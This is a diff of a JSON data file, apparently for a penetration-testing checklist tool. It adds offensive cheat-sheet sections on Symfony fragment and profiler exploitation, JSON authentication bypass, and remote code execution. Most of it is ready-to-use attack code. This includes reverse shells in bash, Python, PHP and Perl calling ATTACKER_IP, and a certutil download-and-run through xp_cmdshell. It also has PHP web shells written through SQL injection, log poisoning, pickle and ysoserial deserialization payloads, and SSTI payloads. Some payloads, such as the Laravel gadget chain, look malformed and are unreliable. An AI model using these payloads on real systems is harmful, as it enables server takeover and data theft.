+              "code": "# Clone and use the exploit tool\ngit clone https://github.com/ambionics/symfony-exploits.git\ncd symfony-exploits\n\n# Discovery mode\npython3 secret_fragment_exploit.py http://target.com/_fragment\n\n# With known secret\npython3 secret_fragment_exploit.py http://target.com/_fragment --secret 'ThisTokenIsNotSoSecretChangeIt'\n\n# RCE Method 1\npython3 secret_fragment_exploit.py http://target.com/_fragment \\\n  --secret 'ThisTokenIsNotSoSecretChangeIt' \\\n  --method 1 \\\n  --function system \\\n  --parameters cmd:'id'\n\n# RCE Method 2 (with Monolog)\npython3 secret_fragment_exploit.py http://target.com/_fragment \\\n  --secret 'ThisTokenIsNotSoSecretChangeIt' \\\n  --method 2 \\\n  --parameters payload:'system id'"
+            },
+            {
+              "type": "checklist",
+              "text": "Manual Signature Generation",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Generate HMAC signature manually\nphp -r \"\necho urlencode(base64_encode(hash_hmac(\n    'sha256',\n    'http://target.com/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull',\n    'ThisTokenIsNotSoSecretChangeIt',\n    true\n)));\n\"\n\n# Construct exploit URL\nhttp://target.com/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GENERATED_HASH"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "CVE-2024-50340 - Profiler Access via Argv"
+            },
+            {
+              "type": "text",
+              "text": "When register_argc_argv is enabled, attackers can force APP_ENV=dev via URL parameters."
+            },
+            {
+              "type": "checklist",
+              "text": "Exploit Profiler Access",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Force dev environment\ncurl http://target.com/?+--env=dev\n\n# Access profiler\ncurl http://target.com/_profiler/?+--env=dev\n\n# Access phpinfo (find APP_SECRET)\ncurl http://target.com/_profiler/phpinfo?+--env=dev"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Symfony Profiler Information Disclosure"
+            },
+            {
+              "type": "checklist",
+              "text": "Sensitive Data in Profiler",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Profiler endpoints\n/_profiler/\n/_profiler/phpinfo\n/_profiler/TOKEN/search\n/_profiler/TOKEN/template\n/_profiler/TOKEN/wdt\n\n# Look for:\n# - APP_SECRET in phpinfo\n# - Database credentials\n# - Form data (passwords in clear)\n# - Session data\n# - HTTP requests/responses"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Symfony Sensitive Paths"
+            },
+            {
+              "type": "checklist",
+              "text": "Endpoints to Check",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "/_fragment\n/_fragment?_controller=system&command=whoami&_hash=XXX\n/_profiler/\n/_profiler/phpinfo\n/_profiler/TOKEN\n/_wdt/\n/admin/\n/api/\n/login\n/logout\n/user\n/config\n/info\n/phpinfo.php\n/app.php\n/app_dev.php\n/install.php"
+            },
+            {
+              "type": "checklist",
+              "text": "File Read via Vulnerabilities",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "name": "bash",
+              "code": "# Read Symfony configuration files\n/config/packages/\n/var/cache/\n/var/log/\n\n# Common files containing secrets\n/config/secrets/prod/prod.decrypt.private.php\n/.env\n/var/cache/dev/App_KernelDevDebugContainer.php"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "EOS Tool - Enemies Of Symfony"
+            },
+            {
+              "type": "text",
+              "text": "Automated tool for exploiting Symfony profiler and extracting sensitive data."
+            },
+            {
+              "type": "checklist",
+              "text": "EOS Installation & Usage",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Install EOS\ngit clone https://github.com/Synacktiv/EOS.git\ncd EOS\n\n# Basic scan\npython3 eos.py http://target.com/\n\n# With CVE-2024-50340\npython3 eos.py http://target.com/?+--env=dev"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "Other Symfony Vulnerabilities"
+            },
+            {
+              "type": "checklist",
+              "text": "CVE-2012-6432 - Fragment Authentication Bypass",
+              "checked": false
+            },
+            {
+              "type": "checklist",
+              "text": "CVE-2014-5245 - SSRF in Fragment",
+              "checked": false
+            },
+            {
+              "type": "checklist",
+              "text": "CVE-2015-4050 - Fragment Token Bypass",
+              "checked": false
+            },
+            {
+              "type": "checklist",
+              "text": "IDOR in User Registration/Profile",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Check for predictable user IDs\n/user/1\n/user/2\n/user/3\n\n# Modify other users' profiles\nPUT /user/123\n{\"email\": \"attacker@evil.com\", \"role\": \"admin\"}"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "Tools & References"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://github.com/ambionics/symfony-exploits",
+                "https://github.com/Synacktiv/EOS",
+                "https://github.com/nicholasaleks/graphql-witcher"
+              ]
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Nuclei templates for Symfony\nnuclei -u http://target.com -t cves/ -tag symfony\nnuclei -u http://target.com -t misconfiguration/ -tag symfony"
+            },
+            {
+              "type": "header",
+              "level": 2,
+              "text": "References"
+            },
+            {
+              "type": "links",
+              "urls": [
+                "https://www.ambionics.io/blog/symfony-secret-fragment",
+                "https://blog.lexfo.fr/symfony-secret-fragment.html",
+                "https://cheatsheetseries.owasp.org/cheatsheets/Symfony_Cheat_Sheet.html"
+              ]
             }
           ]
         }
@@ -3303,492 +3375,214 @@
     },
     {
       "id": "json-attack",
-      "name": "Json Attack",
+      "name": "JSON Attack",
       "icon": "{ }",
       "items": [
         {
           "id": "json",
-          "name": "Json",
+          "name": "JSON Manipulation",
           "type": "content",
           "content": [
             {
+              "type": "header",
+              "level": 2,
+              "text": "JSON Attack Techniques"
+            },
+            {
               "type": "text",
-              "text": "97 JSON Tests for for Authentication Endpoints link pdf [link](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)"
+              "text": "Test various JSON manipulation techniques to bypass authentication, trigger parsing errors, or exploit logic flaws."
             },
             {
-              "type": "technique",
-              "title": "Basic credentials",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "1. JSON Injection"
             },
             {
-              "type": "technique",
-              "title": "Empty credentials:",
-              "description": ""
+              "type": "checklist",
+              "text": "JSON Injection in Values",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Null values:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"admin\", \"password\": \"pass\"}\n# Try injecting JSON in string values\n{\"username\": \"admin\\\", \"password\": \"regular_user\", \"role\": \"admin\"}\""
             },
             {
-              "type": "technique",
-              "title": "Credentials as numbers:",
-              "description": ""
+              "type": "checklist",
+              "text": "JSON Injection in Keys",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Credentials as booleans:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"username\": \"admin\", \"password\": \"pass\", \"role\": \"admin\"}\n# Inject additional key\n{\"username\": \"admin\", \"password\": \"pass\", \"role\": \"admin\"}extra"
             },
             {
-              "type": "technique",
-              "title": "Credentials as arrays:",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "2. Type Confusion Attacks"
             },
             {
-              "type": "technique",
-              "title": "Credentials as objects:",
-              "description": ""
+              "type": "checklist",
+              "text": "Boolean Coercion Bypass",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Special characters in credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Server expects boolean\n{\"authenticated\": true}\n{\"isAdmin\": true}\n{\"admin\": true}\n{\"role\": \"admin\"}\n{\"active\": true}"
             },
             {
-              "type": "technique",
-              "title": "SQL Injection:",
-              "description": ""
+              "type": "checklist",
+              "text": "Numeric Type Confusion",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "HTML tags in credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# String expected but number sent\n{\"user_id\": 1}  # vs {\"user_id\": \"1\"}\n{\"amount\": 0}  # vs {\"amount\": \"0\"}\n{\"admin\": 1}  # vs {\"admin\": true}"
             },
             {
-              "type": "technique",
-              "title": "Unicode in credentials:",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "3. Mass Assignment / Parameter Pollution"
             },
             {
-              "type": "technique",
-              "title": "Credentials with escape characters:",
-              "description": ""
+              "type": "checklist",
+              "text": "Privilege Escalation via Extra Fields",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Credentials with white space:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Try adding admin/role fields\n{\"username\": \"user\", \"password\": \"pass\", \"admin\": true}\n{\"username\": \"user\", \"password\": \"pass\", \"role\": \"admin\"}\n{\"username\": \"user\", \"password\": \"pass\", \"is_admin\": 1}\n{\"username\": \"user\", \"password\": \"pass\", \"privileges\": [\"admin\", \"moderator\"]}"
             },
             {
-              "type": "technique",
-              "title": "Overlong values:",
-              "description": ""
+              "type": "checklist",
+              "text": "Override Protected Fields",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Malformed JSON (missing brace):",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Try overriding normally server-set fields\n{\"email\": \"user@example.com\", \"email_verified\": true}\n{\"username\": \"user\", \"created_at\": \"2099-01-01\"}\n{\"amount\": 100, \"_internal_amount\": 1}"
             },
             {
-              "type": "technique",
-              "title": "Malformed JSON (extra comma):",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "4. JSON Parsing Vulnerabilities"
             },
             {
-              "type": "technique",
-              "title": "Missing login key:",
-              "description": ""
+              "type": "checklist",
+              "text": "Duplicate Keys (Last Value Wins)",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Missing password key:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"password\": \"attacker_pass\", \"password\": \"victim_pass\"}\n# In some parsers, second value wins\n{\"username\": \"attacker\", \"username\": \"victim\"}"
             },
             {
-              "type": "technique",
-              "title": "Swapped key values:",
-              "description": ""
+              "type": "checklist",
+              "text": "Deep Nested Objects",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Extra keys:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"user\": {\"user\": {\"user\": {\"user\": {\"user\": \"admin\"}}}}}\n# Can cause DoS or parsing issues"
             },
             {
-              "type": "technique",
-              "title": "Missing colon:",
-              "description": ""
+              "type": "checklist",
+              "text": "Array Coercion",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Invalid Boolean as credentials:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Try wrapping values in arrays\n{\"username\": [\"admin\"]}\n{\"password\": [\"password\"]}\n{\"id\": [[1]]}"
             },
             {
-              "type": "technique",
-              "title": "All keys, no values:",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "5. Encoding/Format Manipulation"
             },
             {
-              "type": "technique",
-              "title": "Nested objects:",
-              "description": ""
+              "type": "checklist",
+              "text": "Unicode / Homograph Attacks",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Case sensitivity testing:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Cyrillic 'а' looks like Latin 'a'\n{\"username\": \"аdmin\", \"password\": \"password\"}\n{\"username\": \"admin\\u0061\", \"password\": \"password\"}\n# Zero-width characters\n{\"username\": \"admin\\u200B\", \"password\": \"admin\"}"
             },
             {
-              "type": "technique",
-              "title": "Login as a number, password as a string:",
-              "description": ""
+              "type": "checklist",
+              "text": "Base64 Encoded Values",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Login as a string, password as a number:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Some apps accept base64-encoded JSON\n{\"data\": \"eyJ1c2VybmFtZSI6ImFkbWluIn0=\"}  # {\"username\":\"admin\"}"
             },
             {
-              "type": "technique",
-              "title": "Repeated keys:",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "6. JSON vs XML Conversion Issues"
             },
             {
-              "type": "technique",
-              "title": "Single quotes instead of double:",
-              "description": ""
+              "type": "checklist",
+              "text": "XML-like Syntax Injection",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Login and password with only special characters:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# If JSON is converted to XML\n{\"user\": \"<script>alert(1)</script>\"}\n{\"user\": \"<![CDATA[admin]]>\"}"
             },
             {
-              "type": "technique",
-              "title": "Unicode escape sequence:",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "7. DoS / Parser Exploitation"
             },
             {
-              "type": "technique",
-              "title": "Value as object instead of string:",
-              "description": ""
+              "type": "checklist",
+              "text": "Billion Laughs Attack (Recursive Entities)",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Nonexistent variables as values:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "# Not directly applicable to JSON, but large/deep structures can cause DoS\n{\"a\": {\"a\": {\"a\": {\"a\": ...}}}}  # Deeply nested"
             },
             {
-              "type": "technique",
-              "title": "Extra nested objects:",
-              "description": ""
+              "type": "checklist",
+              "text": "Overly Long Strings",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "Hexadecimal values:",
-              "description": ""
+              "type": "code",
+              "lang": "json",
+              "code": "{\"data\": \"A\" * 10000000}"
             },
             {
-              "type": "technique",
-              "title": "Extra symbols after valid JSON:",
-              "description": ""
+              "type": "header",
+              "level": 2,
+              "text": "Tools & References"
             },
             {
-              "type": "technique",
-              "title": "Only keys, without values:",
-              "description": ""
+              "type": "links",
+              "urls": [
+                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token",
+                "https://github.com/payloadbox/json-injection-payload-list"
+              ]
             },
             {
-              "type": "technique",
-              "title": "Insertion of control characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Long Unicode Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Newline Characters in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Tab Characters in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with HTML content in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON Injection in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with XML content in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Combination of Number, Strings, and Special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Use of environment variables:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Backslashes in Strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Long strings of special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Empty Key in JSON:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON Injection in Key:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Quotation marks in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials as nested arrays:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials as nested objects:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Keys as numbers:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Testing with greater than and less than signs:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Testing with parentheses in credentials:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials containing slashes:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Credentials containing multiple data types:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using escape sequences:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using curly braces in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using square brackets in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with only special characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with control characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Null characters in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Exponential numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Hexadecimal numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Leading zeros in numeric strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Multilingual input (here, English and Korean):",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Extremely long keys:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Extremely long unicode strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with semicolon:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with backticks:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with plus sign:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON strings with equal sign:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with Asterisk (*) Symbol:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON containing JavaScript code:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Negative numbers as strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Values as URLs:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with email format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with IP address format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with date format:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with exponential values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with negative exponential values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using Zero Width Space (U+200B) in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Using Zero Width Joiner (U+200D) in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with extremely large numbers:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with backspace characters:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Test with emoji in strings:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with comments, although they are not officially supported in JSON:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with base64 encoded values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Including null byte character (may cause truncation):",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "JSON with credentials in scientific notation:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "Strings with octal values:",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "writeup",
-              "description": ""
-            },
-            {
-              "type": "technique",
-              "title": "writeup",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": "# JSON parsing libraries to test\n# Node.js: JSON.parse()\n# Python: json.loads()\n# Ruby: JSON.parse()\n# Java: ObjectMapper, Gson\n# Go: json.Unmarshal()\n\n# Test with Burp Suite Intruder\n# Use JSON as payload and vary structure"
             }
           ]
         }
@@ -3954,7 +3748,7 @@
             {
               "type": "code",
               "lang": "",
-              "code": "Another common scenario is that you’ll perform an action in a web applica\u0002tion, intercept the request, and locate several bonus headers or parameters \nwithin it, like so:\n\nPOST /create/user\n--snip--\n{\n\"username\": \"hapi_hacker\"\n\"pass\": \"ff7ftw\",\n\"uam\": 1,\n\"mfa\": true,\n\"account\": 101\n}"
+              "code": "Another common scenario is that you'll perform an action in a web applica\u0002tion, intercept the request, and locate several bonus headers or parameters \nwithin it, like so:\n\nPOST /create/user\n--snip--\n{\n\"username\": \"hapi_hacker\"\n\"pass\": \"ff7ftw\",\n\"uam\": 1,\n\"mfa\": true,\n\"account\": 101\n}"
             },
             {
               "type": "text",
@@ -4150,58 +3944,315 @@
     },
     {
       "id": "rce",
-      "name": "Rce",
+      "name": "RCE Techniques",
       "icon": "💥",
       "items": [
         {
           "id": "Rce",
-          "name": "Rce",
+          "name": "Remote Code Execution",
           "type": "content",
           "content": [
             {
-              "type": "technique",
-              "title": "RCE via Dependency Confusion",
-              "description": ""
+              "type": "header",
+              "level": 2,
+              "text": "Remote Code Execution Vectors"
             },
             {
-              "type": "technique",
-              "title": "rce via file upload",
-              "description": ""
+              "type": "text",
+              "text": "RCE allows attackers to execute arbitrary commands on the target server. Multiple vectors can lead to code execution."
             },
             {
-              "type": "technique",
-              "title": "rce via sql injection",
-              "description": ""
+              "type": "header",
+              "level": 3,
+              "text": "1. Command Injection"
             },
             {
-              "type": "technique",
-              "title": "rce via lfi",
-              "description": ""
+              "type": "checklist",
+              "text": "Basic Command Injection Payloads",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "rce via ssrf",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": "# Unix\n;whoami\n|whoami\n&whoami\n&&whoami\n||whoami\n`whoami`\n$(whoami)\n\n# Windows\n;whoami\n&whoami\n|whoami"
             },
             {
-              "type": "technique",
-              "title": "rce via xxe",
-              "description": ""
+              "type": "checklist",
+              "text": "Blind Command Injection (Time-based)",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "rce via command injection",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": ";sleep 5\n|sleep 5\n& sleep 5\n&& sleep 5\n|| sleep 5\n`sleep 5`\n$(sleep 5)"
             },
             {
-              "type": "technique",
-              "title": "rce via Insecure deserialization",
-              "description": ""
+              "type": "checklist",
+              "text": "Filter Bypass - Space Bypass",
+              "checked": false
             },
             {
-              "type": "technique",
-              "title": "rce via SSTI",
-              "description": ""
+              "type": "code",
+              "lang": "bash",
+              "code": "${IFS}\n<\n>\n{,}\n{cat,/etc/passwd}\ncat${IFS}/etc/passwd\ncat</etc/passwd"
+            },
+            {
+              "type": "checklist",
+              "text": "Filter Bypass - Character Escape",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "w\\hoami\nwho\\ami\nwhoam\\i\nwh$(echo o)a$(echo mi)"
+            },
+            {
+              "type": "checklist",
+              "text": "Reverse Shell Payloads",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Bash\nbash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n\n# Python\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER_IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'\n\n# PHP\nphp -r '$sock=fsockopen(\"ATTACKER_IP\",PORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n# Perl\nperl -e 'use Socket;$i=\"ATTACKER_IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "2. SQL Injection to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "MSSQL xp_cmdshell",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Enable xp_cmdshell\n'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--\n\n# Execute command\n'; EXEC xp_cmdshell 'whoami';--\n'; EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER_IP/shell.exe c.exe && c.exe';--"
+            },
+            {
+              "type": "checklist",
+              "text": "MySQL INTO OUTFILE",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Write web shell\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\n\n# Access shell\nhttp://target.com/shell.php?cmd=whoami"
+            },
+            {
+              "type": "checklist",
+              "text": "PostgreSQL COPY FROM Program",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Write file\n'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--\n\n# Execute commands\n'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT cmd_output FROM cmd_exec;--"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "3. File Upload to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "PHP Web Shell",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "php",
+              "code": "<?php system($_GET['cmd']); ?>\n\n<?php\nif(isset($_GET['cmd'])) {\n    echo \"<pre>\";\n    $cmd = $_GET['cmd'];\n    $output = shell_exec($cmd);\n    echo $output;\n    echo \"</pre>\";\n}\n?>\n\n<?php eval($_POST['cmd']); ?>"
+            },
+            {
+              "type": "checklist",
+              "text": "Bypass Extension Filtering",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Double extension\nshell.php.jpg\nshell.php5\nshell.phtml\nshell.phar\n\n# Null byte (historically)\nshell.php%00.jpg\n\n# Case variation\nshell.PhP\nshell.PHP\n\n#htaccess abuse\n# Upload .htaccess with: AddType application/x-httpd-php .jpg"
+            },
+            {
+              "type": "checklist",
+              "text": "Content-Type Bypass",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Change Content-Type to image\nContent-Type: image/png\n\n# But content is PHP\nGIF89a;\n<?php system($_GET['cmd']); ?>"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "4. LFI to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "Log Poisoning",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Poison Apache/Nginx logs\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://target.com/\n\n# Access via LFI\nhttp://target.com/?page=/var/log/apache2/access.log&cmd=whoami\n\n# Poison SSH logs\nssh '<?php system($_GET[\"cmd\"]); ?>'@target.com\n# Then access via LFI\nhttp://target.com/?page=/var/log/auth.log&cmd=whoami"
+            },
+            {
+              "type": "checklist",
+              "text": "PHP Session File Poisoning",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Find session storage path\n/var/lib/php/sessions/\ntmp/\n/var/tmp/\n\n# Upload payload in username field\n# Session file: sess_SESSIONID\n# LFI: ?page=/var/lib/php/sessions/sess_abc123"
+            },
+            {
+              "type": "checklist",
+              "text": "PHP Wrapper Abuse",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# php://input (POST data contains PHP)\nhttp://target.com/?page=php://input\nPOST: <?php system($_GET['cmd']); ?>\n\n# data://text/plain\nhttp://target.com/?page=data://text/plain,<?php system($_GET['cmd']);?>\n\n# expect://\nhttp://target.com/?page=expect://whoami"
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "5. Deserialization to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "PHP Object Injection",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "php",
+              "code": "# PHP gadget chain example\nO:8:\"Exception\":2:{s:7:\"\\00*\\00message\";s:17:\"whoami\";s:7:\"\\00*\\00code\";i:0;}\n\n# Laravel/Faker injection (CVE-2017-17742)\nO:29:\"Illuminate\\Routing\\ViewController\":1:{s:10:\"\\00*\\00data\";O:30:\"Illuminate\\Routing\\UrlGenerator\":3:{s:10:\"\\00*\\00routes\";s:1:\"a\";s:17:\"\\00*\\00methodParams\";a:1:{i:0;O:48:\"Illuminate\\Database\\Eloquent\\Builder\":1:{s:8:\"\\00*\\00connection\";O:37:\"Illuminate\\Database\\Eloquent\\DefaultConnection\":3:{s:12:\"\\00*\\00pdo\";O:27:\"PDO\":1:{s:8:\"queryString\";s:14:\"system('whoami');\";}}}}}}"
+            },
+            {
+              "type": "checklist",
+              "text": "Python Pickle Deserialization",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "python",
+              "code": "import pickle\nimport base64\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        cmd = \"whoami\"\n        return (os.system, (cmd,))\n\n# Generate payload\npayload = base64.b64encode(pickle.dumps(RCE()))\nprint(payload)"
+            },
+            {
+              "type": "checklist",
+              "text": "Java Native Serialization",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "bash",
+              "code": "# Use ysoserial for Java deserialization\njava -jar ysoserial.jar CommonsCollections6 \"whoami\" > payload.ser\n\n# For specific applications, check available gadget chains:\njava -jar ysoserial.jar List<Gadget> \"command\"\n# Gadgets: BeanComparator, CommonsCollections1-7, Spring1, Spring2, Groovy1, etc."
+            },
+            {
+              "type": "header",
+              "level": 3,
+              "text": "6. SSTI to RCE"
+            },
+            {
+              "type": "checklist",
+              "text": "Jinja2 (Python) RCE",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "python",
+              "code": "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\n{{config}}\n{{''.__class__.__mro__[1].__subclasses__()}}"
+            },
+            {
+              "type": "checklist",
+              "text": "Twig (PHP) RCE",
+              "checked": false
+            },
+            {
+              "type": "code",
+              "lang": "php",
+              "code": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat /etc/passwd']|filter('passthru')}}"
+            },
+            {
